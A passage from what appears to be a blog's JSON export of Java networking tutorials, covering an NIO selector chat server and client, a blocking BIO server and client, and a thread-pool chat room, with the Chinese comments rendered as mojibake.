Charset.forName(String.valueOf(StandardCharsets.UTF_8)); public ChatServer(){ this(DEFAULT_PORT); } public ChatServer(int port) { this.port = port; } public boolean readyToQuit(String msg){ return QUIT.equals(msg); } public void close(Closeable closeable){ if(closeable != null) { try { closeable.close(); } catch (IOException e) { e.printStackTrace(); } } } public void start(){ try { //åˆ›å»ºServerSocketChannelé€šé“ serverSocketChannel = ServerSocketChannel.open(); //è®¾ç½®éé˜»å¡æ¨¡å¼ï¼Œé»˜è®¤æƒ…å†µä¹Ÿæ˜¯é˜»å¡è°ƒç”¨çš„ serverSocketChannel.configureBlocking(false); //ç»‘å®šç«¯å£å· serverSocketChannel.bind(new InetSocketAddress(port)); //åˆ›å»ºselector selector = Selector.open(); //å°†acceptäº‹ä»¶æ³¨å†Œåˆ°selectorä¸Š serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT); System.out.println(&quot;æœåŠ¡å™¨å¯åŠ¨æˆåŠŸï¼Œç›‘å¬ç«¯å£å·ï¼š&quot; + port + &quot;...&quot;); //å¼€å§‹è¿›å…¥ç›‘å¬æ¨¡å¼ while(true){ //é˜»å¡å¼è°ƒç”¨ selector.select(); //è·å–æ‰€æœ‰çš„ç›‘å¬äº‹ä»¶ï¼Œ Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys(); for (SelectionKey selectionKey : selectionKeys) { //å¤„ç†äº‹ä»¶ handles(selectionKey); } //å°†å·²ç»å¤„ç†å®Œæˆçš„äº‹ä»¶è¿›è¡Œæ¸…ç©º selectionKeys.clear(); } } catch (IOException e) { e.printStackTrace(); }finally { close(selector); } } /** * å¤„ç†äº‹ä»¶ å¤„ç†acceptäº‹ä»¶ å’Œ readäº‹ä»¶ * @param selectionKey ä¸selectorç»‘å®šçš„channelçš„key */ private void handles(SelectionKey selectionKey) throws IOException { if(selectionKey.isAcceptable()){ //å¤„ç†acceptäº‹ä»¶ //å…ˆè¦è·å–ServerSocketChannel ServerSocketChannel server =(ServerSocketChannel) selectionKey.channel(); // æˆ‘è§‰å¾—è¿™æ ·å†™ä¹Ÿè¡Œ ç›´æ¥è°ƒç”¨å…¨å±€å˜é‡ SocketChannel socketChannel = serverSocketChannel.accept(); //è·å–å¯¹åº”çš„å®¢æˆ·ç«¯çš„é€šé“ SocketChannel socketChannel = server.accept(); socketChannel.configureBlocking(false); //å°†å®¢æˆ·ç«¯é€šé“ç»‘å®šåˆ°selectorä¸Šï¼Œç›‘å¬readäº‹ä»¶ socketChannel.register(selector,SelectionKey.OP_READ); System.out.println(&quot;å®¢æˆ·ç«¯&quot; + socketChannel.socket().getPort() + &quot;:å·²ç»è¿æ¥&quot;); }else if(selectionKey.isReadable()){ //å¤„ç†readäº‹ä»¶ SocketChannel clientChannel = (SocketChannel) selectionKey.channel(); String fwdMsg = receive(clientChannel); if(fwdMsg.isEmpty()){ //æ¥ä¸åˆ°æ¶ˆæ¯äº†ï¼Œé‚£ä¹ˆå°±æŠŠè¿™ä¸ªé€šé“ç»™ä»–ç§»é™¤äº† selectionKey.cancel(); //é€šçŸ¥selectoræœ‰æ³¨å†Œçš„é€šé“è¢«ç§»é™¤äº†ï¼Œæ›´æ–°çŠ¶æ€ selector.wakeup(); }else { //è½¬å‘æ¶ˆæ¯ forwardMessage(clientChannel,fwdMsg); if(readyToQuit(fwdMsg)){ selectionKey.cancel(); selector.wakeup(); } } } } /** * è½¬å‘æ¶ˆæ¯ * @param clientChannel å®¢æˆ·ç«¯é€šé“ * @param fwdMsg è½¬å‘çš„æ¶ˆæ¯ */ private void forwardMessage(SocketChannel clientChannel, String fwdMsg) throws IOException { //keysæ–¹æ³•åŒºåˆ«äºselectedKeys,è¿™ä¸ªæ–¹æ³•è¿”å›çš„æ˜¯æ¥ä¸‹æ¥éœ€è¦è¢«å¤„ç†çš„é€šé“key //è€Œkeysåˆ™è¿”å›ä¸selectorç»‘å®šçš„æ‰€æœ‰é€šé“key //è·³è¿‡ServerSocketChannelå’Œæœ¬èº« for (SelectionKey selectionKey : selector.keys()) { SelectableChannel channel = selectionKey.channel(); if(channel instanceof ServerSocketChannel) System.out.println(&quot;å®¢æˆ·ç«¯&quot; + clientChannel.socket().getPort() + &quot;ï¼š&quot; + fwdMsg); else if(selectionKey.isValid() &amp;&amp; !channel.equals(clientChannel)){ wBuffer.clear(); //å†™å…¥æ¶ˆæ¯ wBuffer.put(charset.encode(&quot;å®¢æˆ·ç«¯&quot; + clientChannel.socket().getPort() + &quot;ï¼š&quot; + fwdMsg)); //è½¬æ¢ä¸ºè¯»æ¨¡å¼ wBuffer.flip(); //æœ‰æ•°æ®å°±ä¸€ç›´è¯» while(wBuffer.hasRemaining()) ((SocketChannel)channel).write(wBuffer); } } } /** * ä»å®¢æˆ·é€šé“ä¸Šè¯»å–æ¶ˆæ¯ * @param clientChannel å®¢æˆ·é€šé“ * @return æ¶ˆæ¯ */ private String receive(SocketChannel clientChannel) throws IOException { //å°†å½“å‰æŒ‡é’ˆç½®äºåˆå§‹ä½ç½®ï¼Œè¦†ç›–å·²æœ‰çš„æ¶ˆæ¯ï¼ˆæ¸…ç©ºæ¶ˆæ¯ï¼‰ rBuffer.clear(); //ä¸åœçš„å‘ç¼“å­˜ä¸­å†™ while(clientChannel.read(rBuffer) &gt; 0); //ç”±å†™æ¨¡å¼åˆ°è¯»æ¨¡å¼ rBuffer.flip(); return String.valueOf(charset.decode(rBuffer)); } public static void main(String[] args) { ChatServer chatServer = new ChatServer(); chatServer.start(); } } 4.2 å®¢æˆ·ç«¯package client; import java.io.Closeable; import java.io.IOException; import java.net.InetSocketAddress; import java.nio.ByteBuffer; import java.nio.channels.*; import java.nio.charset.Charset; import java.nio.charset.StandardCharsets; import java.util.Set; public class ChatClient { private static final String DEFAULT_SERVER_HOST = &quot;127.0.0.1&quot;; private static final int DEFAULT_SERVER_PORT = 8888; private static final String QUIT = &quot;quit&quot;; private static final int BUFFER = 1024; private String host; private int port; private SocketChannel clientChannel; private Selector selector; private ByteBuffer rBuffer = ByteBuffer.allocate(BUFFER); private ByteBuffer wBuffer = ByteBuffer.allocate(BUFFER); private Charset charset = Charset.forName(String.valueOf(StandardCharsets.UTF_8)); public ChatClient(String host, int port) { this.host = host; this.port = port; } public ChatClient() { this(DEFAULT_SERVER_HOST,DEFAULT_SERVER_PORT); } public boolean readyToQuit(String msg){ return QUIT.equals(msg); } public void close(Closeable closeable){ if(closeable != null){ try { closeable.close(); } catch (IOException e) { e.printStackTrace(); } } } public void start(){ try { //åˆ›å»ºç”¨æˆ·é€šé“ clientChannel = SocketChannel.open(); clientChannel.configureBlocking(false);//è¿™ä¸€æ­¥åƒä¸‡ä¸èƒ½å¿˜äº† //åˆ›å»ºselectorï¼Œå¹¶ä¸”å°†ç”¨æˆ·é€šé“çš„connectè¯·æ±‚æ³¨å†Œä¸Šå» selector = Selector.open(); clientChannel.register(selector, SelectionKey.OP_CONNECT); //å°è¯•ä¸æœåŠ¡å™¨åˆ›å»ºè¿æ¥ clientChannel.connect(new InetSocketAddress(host,port)); while (selector.isOpen()){ //ä¸€ç›´ç›‘å¬selectorä¸Šæ³¨å†Œçš„channelè¯·æ±‚ selector.select(); Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys(); for (SelectionKey selectionKey : selectionKeys) { //å“åº”è¯·æ±‚ handles(selectionKey); } selectionKeys.clear(); } } catch (IOException e) { e.printStackTrace(); }catch (ClosedSelectorException e){ } finally { close(selector); } } private void handles(SelectionKey selectionKey) throws IOException { //å¤„ç†connectäº‹ä»¶ if(selectionKey.isConnectable()){ //å¦‚æœèƒ½å¤Ÿä¸æœåŠ¡å™¨å“åº”äº† SocketChannel channel = (SocketChannel) selectionKey.channel(); if(channel.isConnectionPending()){ channel.finishConnect(); //æ­£å¼å»ºç«‹è¿æ¥ new Thread(new UserInputHandler(this)).start(); } channel.register(selector,SelectionKey.OP_READ); }else if(selectionKey.isReadable()){ String msg = receive(clientChannel); SocketChannel channel = (SocketChannel) selectionKey.channel(); if(msg.isEmpty()){ //æœåŠ¡ç«¯å¼‚å¸¸ close(selector); }else { //TODO çœ‹çœ‹è¿™é‡Œä¿¡æ¯å¯¹ä¸å¯¹ System.out.println(msg); } } } private String receive(SocketChannel clientChannel) throws IOException { rBuffer.clear(); //ä¸€ç›´è¯»æ•°æ® while (clientChannel.read(rBuffer) &gt; 0); rBuffer.flip(); return String.valueOf(charset.decode(rBuffer)); } public void send(String msg) throws IOException { if(msg.isEmpty()) return; wBuffer.clear(); wBuffer.put(charset.encode(msg)); wBuffer.flip(); while(wBuffer.hasRemaining()){ clientChannel.write(wBuffer); } if(QUIT.equals(msg)) close(selector); } public static void main(String[] args) { ChatClient chatClient = new ChatClient(); chatClient.start(); } } 4.3 å®¢æˆ·ç«¯ç›‘å¬ç”¨æˆ·è¾“å…¥è¿›ç¨‹package client; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; public class UserInputHandler implements Runnable{ private ChatClient chatClient; public UserInputHandler(ChatClient chatClient) { this.chatClient = chatClient; } @Override public void run() { //ç­‰å¾…ç”¨æˆ·è¾“å…¥ä¿¡æ¯ BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in)); while(true){ try { String msg = consoleReader.readLine(); chatClient.send(msg); if(chatClient.readyToQuit(msg)) break; } catch (IOException e) { e.printStackTrace(); } } } }","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.kayleh.top/tags/network/"}]},{"title":"BIO blocking model","slug":"BIOé˜»å¡æ¨¡å‹","date":"2020-12-03T09:46:43.000Z","updated":"2021-04-11T17:11:28.103Z","comments":true,"path":"BIOé˜»å¡æ¨¡å‹/","link":"","permalink":"https://blog.kayleh.top/BIO%E9%98%BB%E5%A1%9E%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"BIOé˜»å¡æ¨¡å‹1. BIOé˜»å¡æ¨¡å‹ç®€è¿°BIOæ¨¡å‹ä¸­æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯çš„å“åº”è¿‡ç¨‹ æœåŠ¡å™¨serverSocketå…ˆè¦å’Œç«¯å£è¿›è¡Œç»‘å®š ç»‘å®šå®Œæˆåï¼Œæ‰§è¡Œacceptæ–¹æ³•ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯é˜»å¡å¼è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¦ä¸€ç›´ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥å“åº”ï¼Œä¸åšå…¶ä»–äº‹æƒ…ï¼Œä¸€ç›´ç­‰ï¼Œï¼ˆè¢«é˜»å¡çš„è¿˜æœ‰InputStream.read()ã€OutputStream.write()ï¼Œè¿™ä¸¤ä¸ªä¹Ÿä¼šä¸€ç›´ç­‰å¾…å®¢æˆ·ç«¯çš„å“åº”ï¼‰ å®¢æˆ·ç«¯åˆ›å»ºSocketå¯¹è±¡ï¼Œç»‘å®šæœåŠ¡å™¨çš„ipåœ°å€ä¸ç«¯å£å·ï¼Œä¸æœåŠ¡å™¨è¿›è¡Œè¿æ¥ æœåŠ¡å™¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ï¼Œacceptæ–¹æ³•è·å–åˆ°å®¢æˆ·ç«¯çš„socketä¿¡æ¯ï¼Œè¿æ¥æˆåŠŸ æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯åˆ›å»ºå„è‡ªçš„ioæµï¼Œå®ç°å…¨åŒå·¥é€šä¿¡ ä¹‹åä¾¿å¯ä»¥éšæ—¶ç»“æŸè¿æ¥ 2. ç®€å•å®æˆ˜æ¼”ç¤º2.1 æœåŠ¡å™¨import java.io.*; import java.net.ServerSocket; import java.net.Socket; public class Server { public static void main(String[] args) { final int DEFAULT_PORT = 8888; final String QUIT = &quot;quit&quot;; ServerSocket serverSocket = null; try { //ç»‘å®šç«¯å£å· serverSocket = new ServerSocket(DEFAULT_PORT); System.out.println(&quot;æœåŠ¡å™¨å·²ç»å¯åŠ¨ï¼Œç»‘å®šç«¯å£å·ï¼š&quot; + DEFAULT_PORT); while (true){ //ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ Socket socket = serverSocket.accept(); System.out.println(&quot;å®¢æˆ·ç«¯&quot; + socket.getPort() + &quot;:&quot; + &quot;å·²ç»è¿æ¥&quot;); //è·å–ioæµ BufferedReader reader = new BufferedReader( new InputStreamReader(socket.getInputStream()) ); BufferedWriter writer = new BufferedWriter( new OutputStreamWriter(socket.getOutputStream()) ); //è¯»å–å®¢æˆ·å‘é€çš„ä¿¡æ¯ String msg = null; while ((msg = reader.readLine()) != null) { System.out.println(&quot;å®¢æˆ·ç«¯&quot; + socket.getPort() + &quot;:&quot; + msg); //å›å¤æ¶ˆæ¯ writer.write( msg + &quot; ok&quot; +&quot;\\n&quot;); writer.flush(); System.out.println(&quot;æœåŠ¡å™¨ï¼š&quot; + msg + &quot; ok&quot;); if(msg.equals(QUIT)){ System.out.println(&quot;å®¢æˆ·ç«¯&quot; + socket.getPort() + &quot;:æ–­å¼€è¿æ¥&quot; ); break; } } } } catch (IOException e) { e.printStackTrace(); }finally { if(serverSocket != null){ try { serverSocket.close(); System.out.println(&quot;æœåŠ¡å™¨Socketå…³é—­&quot;); } catch (IOException e) { e.printStackTrace(); } } } } } 2.2 å®¢æˆ·ç«¯ import java.io.*; import java.net.Socket; import java.net.UnknownHostException; public class Client { public static void main(String[] args) { final int DEFAULT_SERVER_PORT = 8888; final String DEFAULT_ADDRESS = &quot;127.0.0.1&quot;; final String QUIT = &quot;quit&quot;; Socket socket = null; BufferedWriter writer = null; try { //åˆ›å»ºSocket socket = new Socket(DEFAULT_ADDRESS,DEFAULT_SERVER_PORT); //åˆ›å»ºioæµ writer = new BufferedWriter( new OutputStreamWriter(socket.getOutputStream()) ); BufferedReader reader = new BufferedReader( new InputStreamReader(socket.getInputStream()) ); //ç­‰å¾…ç”¨æˆ·è¾“å…¥ä¿¡æ¯ while (true) { BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in)); String msg = consoleReader.readLine(); //å‘æœåŠ¡å™¨å‘é€æ¶ˆæ¯ writer.write(msg + &quot;\\n&quot;); writer.flush(); System.out.println(&quot;å®¢æˆ·ç«¯&quot;+ &quot;:&quot; + msg); String line = reader.readLine(); System.out.println(&quot;æœåŠ¡å™¨ï¼š&quot; + line); //é€€å‡ºåˆ¤æ–­ if(msg.equals(QUIT)){ break; } } } catch (UnknownHostException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); }finally { if(writer != null){ try { writer.close(); } catch (IOException e) { e.printStackTrace(); } } } } } 2.3 å“åº”ç»“æœ å®¢æˆ·ç«¯ æœåŠ¡å™¨ 3. åŠ æ·±ç†è§£åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å®æˆ˜1. æ¦‚å¿µå›¾è§£åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° BIOæ¨¡å‹ï¼šå®¢æˆ·ç«¯æ¯æœ‰ä¸€ä¸ªè¯·æ±‚ï¼ŒæœåŠ¡ç«¯éƒ½è¦æœ‰ä¸€ä¸ªçº¿ç¨‹æ¥å•ç‹¬å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œå…¸å‹çš„ä¸€è¯·æ±‚ä¸€åº”ç­”ï¼Œjava 1.4ç‰ˆæœ¬ä¹‹å‰ å¯¹äºèŠå¤©å®¤æœåŠ¡å™¨ï¼Œå®ƒæœ‰å¤šä¸ªçº¿ç¨‹ï¼Œå…¶ä¸­ä¸€ä¸ªä¸ºå›¾ä¸Šçš„Acceptorçº¿ç¨‹ï¼ˆChatServerï¼‰ï¼Œå®ƒå®ç°çš„å°±æ˜¯å¯¹æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ä¸æ–­å“åº”ï¼Œåˆ›å»ºåˆ†é…å¤„ç†çº¿ç¨‹ï¼›å¯¹åº”å®¢æˆ·ç«¯çš„æ¯ä¸€ä¸ªè¯·æ±‚ï¼Œéƒ½æœ‰ä¸€ä¸ªå•ç‹¬çš„å¤„ç†çº¿ç¨‹ å¯¹äºå®¢æˆ·ç«¯æ¥è¯´ï¼Œå®ƒæœ‰ä¸¤ä¸ªçº¿ç¨‹ï¼Œå…¶ä¸­ä¸€ä¸ªçº¿ç¨‹ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå¹¶æ¥æ”¶æ¥è‡ªæœåŠ¡å™¨çš„æ¶ˆæ¯ï¼›å¦ä¸€ä¸ªçº¿ç¨‹åˆ™ç”¨æ¥å¤„ç†ç”¨æˆ·çš„è¾“å…¥ï¼Œå¹¶å°†æ¶ˆæ¯å‘é€åˆ°æœåŠ¡å™¨ 1.1 ä¼ªå¼‚æ­¥çš„ä¼˜åŒ–åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° ä½¿ç”¨çº¿ç¨‹æ± çš„åŸå› æ˜¯å› ä¸ºé˜²æ­¢ä¸€å¤§æ‰¹ç”¨æˆ·çš„å“åº”ï¼Œé€ æˆæœåŠ¡å™¨è¿‡è½½ï¼Œå®ç°çº¿ç¨‹çš„å¤ç”¨ï¼Œå‡å°‘ä¸åœçš„åˆ›å»ºåˆ é™¤çº¿ç¨‹é€ æˆçš„èµ„æºéƒèŠ¬ï¼Œè¿™æ ·ä¹Ÿå®ç°äº†BIOçš„ä¼ªå¼‚æ­¥IOé€šä¿¡ I/Oæ¨¡å‹ç³»åˆ—ä¹‹ä¸‰ï¼šIOé€šä¿¡æ¨¡å‹BIO NIO AIO 2. èŠå¤©æœåŠ¡å™¨ä¸­çš„è¦ç‚¹2.1 å­—æ®µåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.2 è½¬å‘æ¶ˆæ¯æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.3 æ·»åŠ å®¢æˆ·æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.4 ç§»é™¤å®¢æˆ·æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.5 æœåŠ¡å™¨ä¸»çº¿ç¨‹ä»»åŠ¡åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.6 æœåŠ¡å™¨å¤„ç†çº¿ç¨‹ä»»åŠ¡ å®ç°Runnableæ¥å£ï¼Œä¹‹åæ‰§è¡Œçš„æ—¶å€™å°†å…¶ä¼ å…¥åˆ°çº¿ç¨‹æ± ä¸­æ‰§è¡Œã€‚ 3. èŠå¤©å®¤å®¢æˆ·ç«¯è¦ç‚¹3.1 å‘æœåŠ¡ç«¯å‘é€æ¶ˆæ¯ï¼Œè®©æœåŠ¡å™¨è½¬å‘ç»™å…¶ä»–äººåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3.2 æ¥æ”¶æœåŠ¡ç«¯çš„æ¶ˆæ¯åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3.3 ä¸»çº¿ç¨‹ä»»åŠ¡åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3.4 å¤„ç†çº¿ç¨‹ä»»åŠ¡ å®ç°Runnableæ¥å£ï¼Œåˆ›å»ºçº¿ç¨‹æ—¶å¯åŠ¨ 4. æµ‹è¯•ç»“æœæœåŠ¡å™¨ç«¯ä¿¡æ¯ 5. å®Œæ•´ä»£ç 5.1 æœåŠ¡å™¨package Server; import java.io.BufferedWriter; import java.io.IOException; import java.io.OutputStreamWriter; import java.io.Writer; import java.net.ServerSocket; import java.net.Socket; import java.util.HashMap; import java.util.Map; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; public class ChatServer { private int DEFAULT_PORT = 8888; private final String QUIT = &quot;quit&quot;; private ServerSocket serverSocket; //å­˜å‚¨å·²ç»è¿æ¥çš„å®¢æˆ·ä»¬ private Map&lt;Integer, Writer&gt; connectedClients; private ExecutorService executorService; public ChatServer() { this.connectedClients = new HashMap&lt;&gt;(); this.executorService = Executors.newFixedThreadPool(10); } //æ·»åŠ å®¢æˆ·ç«¯ public synchronized void addClient(Socket socket) throws IOException { if(socket != null){ int key = socket.getPort(); Writer value = new BufferedWriter( new OutputStreamWriter(socket.getOutputStream()) ); connectedClients.put(key,value); System.out.println(&quot;å®¢æˆ·&quot; + key + &quot;ï¼šå·²ç»è¿æ¥&quot;); } } //ç§»é™¤å®¢æˆ·ç«¯ public synchronized void removeClient(Socket socket) throws IOException { if(socket != null){ int port = socket.getPort(); if(connectedClients.containsKey(port)){ //ç§»é™¤ç”¨æˆ·çš„æ—¶å€™è¦è¿›è¡Œå…³é—­ connectedClients.get(port).close(); connectedClients.remove(port); System.out.println(&quot;å®¢æˆ·ç«¯&quot; + port + &quot;ï¼šå·²ç»æ–­å¼€è¿æ¥&quot;); } } } //å°†æ¶ˆæ¯è½¬å‘ç»™å…¶ä»–ç”¨æˆ· public synchronized void forwardMessage(Socket socket,String fwdMsg) throws IOException { for(Integer port : connectedClients.keySet()){ //ä¸è½¬å‘ç»™è‡ªå·± if(!port.equals(socket.getPort())){ Writer writer = connectedClients.get(port); writer.write(fwdMsg); writer.flush(); } } } //æ£€æŸ¥æ˜¯å¦é€€å‡º public boolean readyToQuit(String msg){ return QUIT.equals(msg); } public void close(){ if(serverSocket != null){ try { serverSocket.close(); } catch (IOException e) { e.printStackTrace(); } } } //å¯åŠ¨ public void start(){ try { //ç»‘å®šç›‘å¬ç«¯å£ serverSocket = new ServerSocket(DEFAULT_PORT); System.out.println(&quot;èŠå¤©å®¤æœåŠ¡å™¨å·²ç»æˆåŠŸå¯åŠ¨ï¼&quot;); while (true){ Socket socket = serverSocket.accept(); //ä¸ºæ¯ä¸ªsocketåˆ›å»ºä¸€æ¡å•ç‹¬çš„çº¿ç¨‹è¿›è¡Œå¤„ç† //new Thread(new ChatHandler(socket,this)).start(); executorService.execute(new ChatHandler(socket,this)); } } catch (IOException e) { e.printStackTrace(); }finally { close(); } } public static void main(String[] args) { ChatServer chatServer = new ChatServer(); chatServer.start(); } } package Server; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.net.Socket; public class ChatHandler implements Runnable { private Socket socket; private ChatServer chatServer; public ChatHandler(Socket socket, ChatServer chatServer) { this.socket = socket; this.chatServer = chatServer; } @Override public void run() { try { //æ·»åŠ å¯¹è±¡ chatServer.addClient(socket); //è¯»å–ç”¨æˆ·å‘é€çš„ä¿¡æ¯ BufferedReader reader = new BufferedReader( new InputStreamReader(socket.getInputStream()) ); String msg = null; //å¿…é¡»è¦è¯»å–åˆ°æ¢è¡Œç¬¦ while ((msg = reader.readLine()) != null){ String fwdMsg =&quot;å®¢æˆ·ç«¯&quot; + socket.getPort() + &quot;ï¼š&quot; + msg + &quot;\\n&quot;; chatServer.forwardMessage(socket,fwdMsg); System.out.print(fwdMsg); //æ£€æŸ¥æ˜¯å¦é€€å‡º if(chatServer.readyToQuit(msg)){ break; } } } catch (IOException e) { e.printStackTrace(); }finally { try { chatServer.removeClient(socket); } catch (IOException e) { e.printStackTrace(); } } } } 5.2 å®¢æˆ·ç«¯package Client; import Server.ChatServer; import java.io.*; import java.net.Socket; import java.net.UnknownHostException; public class ChatClient { private String DEFAULT_SERVER_HOST = &quot;127.0.0.1&quot;; private int DEFAULT_PORT = 8888; private final String QUIT = &quot;quit&quot;; private Socket socket; private BufferedReader reader; private BufferedWriter writer; //å‘é€æ¶ˆæ¯ç»™æœåŠ¡å™¨ public void sendMsg(String msg) throws IOException { //è¾“å‡ºæµæ²¡æœ‰å…³é—­çš„æƒ…å†µ if(!socket.isOutputShutdown()){ writer.write(msg + &quot;\\n&quot;); writer.flush(); } } //æ¥å—æ¶ˆæ¯ä»æœåŠ¡å™¨ public String receiveMsg() throws IOException { if(!socket.isInputShutdown()){ return reader.readLine(); } return null; } //æ£€æŸ¥æ˜¯å¦é€€å‡º public boolean readyToQuit(String msg){ return QUIT.equals(msg); } //å…³é—­ public void close(){ try { writer.close(); } catch (IOException e) { e.printStackTrace(); } } //å¯åŠ¨å¼€å…³ public void start(){ try { //åˆ›å»ºsocket socket = new Socket(DEFAULT_SERVER_HOST,DEFAULT_PORT); //åˆ›å»ºioæµ writer = new BufferedWriter( new OutputStreamWriter(socket.getOutputStream()) ); reader = new BufferedReader( new InputStreamReader(socket.getInputStream()) ); //å¤„ç†ç”¨æˆ·çš„è¾“å…¥çš„çº¿ç¨‹ new Thread(new UserInputHandler(this)).start(); //ç›‘å¬ä»æœåŠ¡å™¨æ¥çš„æ¶ˆæ¯ String msg = null; while ((msg = receiveMsg()) != null){ System.out.println(msg); } } catch (UnknownHostException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); }finally { close(); } } public static void main(String[] args) { ChatClient chatClient = new ChatClient(); chatClient.start(); } } package Client; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; public class UserInputHandler implements Runnable{ private ChatClient chatClient; public UserInputHandler(ChatClient chatClient) { this.chatClient = chatClient; } @Override public void run() { //ç­‰å¾…ç”¨æˆ·è¾“å…¥ä¿¡æ¯ BufferedReader reader = new BufferedReader( new InputStreamReader(System.in) ); while (true){ try { String msg = reader.readLine(); //å‘æœåŠ¡å™¨å‘é€æ¶ˆæ¯ chatClient.sendMsg(msg); if(chatClient.readyToQuit(msg)) break; } catch (IOException e) { e.printStackTrace(); } } } }","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.kayleh.top/tags/network/"}]},{"title":"I/O model","slug":"I-Oæ¨¡å‹","date":"2020-12-03T09:44:24.000Z","updated":"2021-04-11T17:11:28.157Z","comments":true,"path":"I-Oæ¨¡å‹/","link":"","permalink":"https://blog.kayleh.top/I-O%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"I/Oæ¨¡å‹1. java.ioä¸‹çš„å­—ç¬¦æµå’Œå­—èŠ‚æµåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 1.1 å­—ç¬¦æµå­—ç¬¦æµæ›´åŠ çš„æ–¹ä¾¿æˆ‘ä»¬ä½¿ç”¨ï¼Œä¸€èˆ¬å­—ç¬¦éƒ½æ˜¯ç”±å¤šä¸ªå­—èŠ‚æ¥å½¢æˆçš„ï¼Œè‹¥æˆ‘ä»¬ä½¿ç”¨å­—èŠ‚æµä¼ è¾“ï¼Œåˆ™è¿˜éœ€è¦æˆ‘ä»¬è‡ªå·±å°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ï¼Œè‹¥æˆ‘ä»¬ç›´æ¥ä½¿ç”¨å­—ç¬¦æµçš„è¯ï¼Œè¿™æ ·å°±èƒ½ç›´æ¥è¯»å–ä¸è¾“å‡ºå­—ç¬¦ã€‚ CharArrayReaderï¼šæ˜¯åŸºç¡€çš„å­—ç¬¦è¾“å…¥æµï¼Œèƒ½ä»å­—ç¬¦æ•°ç»„ä¸­è¯»å–æ•°æ® StringReaderï¼šä»å­—ç¬¦ä¸²è¾“å…¥æµä¸­è¯»å–æ•°æ® è¾“å‡ºæµåŒç† 1.1.1 æ›´é«˜çº§çš„å­—ç¬¦æµåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° BufferedReaderï¼šé™„å¸¦ç¼“å­˜åŒºçš„å­—ç¬¦è¾“å…¥æµï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼Œè€Œæ˜¯å°†æˆ‘ä»¬å·²ç»åˆ›å»ºçš„Readerå­—ç¬¦æµï¼Œä¼ å…¥è¿›æ¥ï¼Œå°±åƒå¯¹å®ƒå‡çº§ä¸€æ ·ï¼Œå¤šäº†æ›´å¤šçš„åŠŸèƒ½ï¼Œæ¯”å¦‚è¯¥å­—ç¬¦æµå°±æ˜¯æä¾›äº†ç¼“å­˜åŒºï¼Œè¿™æ ·åŠ å¿«äº†ioçš„æ•ˆç‡ï¼Œä¸å¿…é‡å¤è¯»å–åŸå§‹æ•°æ®æº FilterReaderï¼šåŒæ ·ä¹Ÿæ˜¯è¿ç”¨äº†è£…é¥°æ¨¡å¼ï¼Œå®ƒé¢å¤–çš„åŠŸèƒ½èƒ½å¯¹å­—ç¬¦æµä¸­çš„å­—ç¬¦è¿›è¡Œç­›é€‰ç­‰ InputStreamReaderï¼šè¿æ¥å­—èŠ‚æµä¸å­—ç¬¦æµçš„ä¸€ä¸ªæ¡¥æ¢ï¼Œå°†å­—èŠ‚æµè½¬åŒ–ä¸ºå­—ç¬¦æµï¼Œæ¯”è¾ƒå¸¸ç”¨çš„å°±æ˜¯FileReader 1.2 å­—èŠ‚æµå­—èŠ‚æµåˆ™æ˜¯å¯¹ä¸€ä¸ªä¸ªå­—èŠ‚è¿›è¡Œè¯»å– ByteArrayInputStreamï¼šå­—èŠ‚æ•°ç»„è¾“å…¥æµï¼Œä»å­—èŠ‚æ•°ç»„ä¸­è·å–æ•°æ® FileInputStreamï¼šæ–‡ä»¶è¾“å…¥æµï¼Œä»æ–‡ä»¶ä¸­è·å–æ•°æ® è¾“å‡ºæµåŒç† 1.2.1 æ›´é«˜çº§çš„å­—èŠ‚æµåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° BufferedInputStreamï¼šé™„å¸¦ç¼“å­˜åŒºçš„å­—èŠ‚è¾“å…¥æµï¼Œå®ƒåŒæ 